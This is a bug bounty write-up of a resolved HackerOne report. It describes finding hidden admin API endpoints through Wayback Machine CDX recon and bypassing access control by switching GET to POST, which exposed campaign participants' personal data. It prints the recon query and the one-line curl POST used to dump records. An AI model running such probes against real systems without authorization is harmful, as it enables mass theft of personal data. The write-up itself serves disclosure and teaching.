---
title: "Unauthenticated Admin API Access via HTTP Verb Tampering "
description: "Wayback Machine recon led to hidden admin endpoints. A simple switch from GET to POST bypassed all access controls, leaking thousands of customer records from a REACTED promotion campaign."
date: 2026-02-03
categories: [Writeups]
tags: [bugbounty, access-control, api, data-breach, verb-tampering]
author: MOZA
toc: true
severity: "Critical"
platform: "HackerOne"
---

## Summary

| Detail | Value |
|--------|-------|
| **Target** | REACTED |
| **Weakness** | Improper Authorization + HTTP Verb Tampering |
| **Severity** | Critical |
| **Reports** | 2 related findings |
| **Status** | Resolved |
| **Platform** | HackerOne |

## The Story

It started with the Wayback Machine.

While mapping a REACTED application, I threw the wildcard scope into the Web Archive CDX API:

```
https://web.archive.org/cdx/search/cdx?url=*.example.com&output=text&fl=original&collapse=urlkey
```

Among the archived URLs, a few interesting endpoints caught my eye:

```
/Dtts3s/winners
/Dtts3s/valid
/Dtts3s/list
```

These looked like admin panel routes for managing a promotional campaign. I hit them with GET requests — nothing. The frontend redirected or returned empty responses. The UI routes appeared protected.

But the underlying API? That's a different story.

## The Vulnerability

I tried **HTTP Verb Tampering** — switching from GET to POST.

```bash
curl -X POST https://app.example.com/Dtts3s/winners
```

The server responded with the **entire database of winners**. No cookies. No JWT. No CSRF token. No authentication of any kind.

```json
{
  "docs": [
    {
      "name": "[REDACTED]",
      "mobileNo": "[REDACTED]",
      "address": "[REDACTED]",
      "city": "...",
      "Winner": true,
      "Status": "Redeemed"
    },
    {
      "name": "[REDACTED]",
      "surname": "[REDACTED]",
      "mobileNo": "[REDACTED]",
      "address": "[REDACTED]",
      "city": "..."
    }
  ]
}
```

All three endpoints were wide open:

| Endpoint | Data Exposed |
|----------|-------------|
| `POST /Dtts3s/winners` | All campaign winners |
| `POST /Dtts3s/valid` | All validated entries |
| `POST /Dtts3s/list` | Full participant database |

### Leaked PII

The JSON responses included:
- **Full names**
- **Mobile phone numbers**
- **Physical addresses**
- **Cities**
- **Receipt numbers** (internal audit data)
- **Winner status and redemption info**

Thousands of customer records from a real promotional campaign — completely exposed.

## Impact

- **Mass data breach** — entire customer database of a promotional campaign accessible to anyone
- **PII exposure** — names, phone numbers, physical addresses of thousands of real people
- **GDPR / privacy law violation** — personal data exposed without any access control
- **Targeted attacks** — leaked phone numbers and addresses enable phishing and social engineering
- **Reputational damage** — a major brand's customer data fully exposed
- **Zero authentication required** — a single `curl` command dumps everything

## Vendor Response

REACTED security team validated the issue quickly:

> *"Thank you, nice catch! We'll definitely keep you in mind when our swag rewards program is ready."*
> — REACTED Cyber Offence Team

The endpoints were fixed by removing data access entirely. The HackerOne triage analyst recommended implementing proper access control across the board rather than just removing data from the specific endpoints.

## Timeline

| Date | Event |
|------|-------|
| 2026-02-03 | Report submitted |
| 2026-02-04 | Validated by HackerOne triage |
| 2026-02-04 | Triaged by REACTED security team |
| 2026-04-27 | Fix confirmed by me |
| 2026-04-28 | Retest completed — fix verified |
| 2026-05-04 | Report resolved |

## Takeaways

1. **Wayback Machine is underrated** — archived URLs often reveal hidden endpoints that are still live
2. **Always try HTTP Verb Tampering** — if GET returns nothing, try POST, PUT, DELETE
3. **Frontend protection ≠ API protection** — just because the UI redirects doesn't mean the API is secured
4. **Check authorization on every endpoint** — especially admin routes managing user data
5. **Vercel preview deployments can leak** — production apps on hosting platforms need the same security controls as traditional deployments
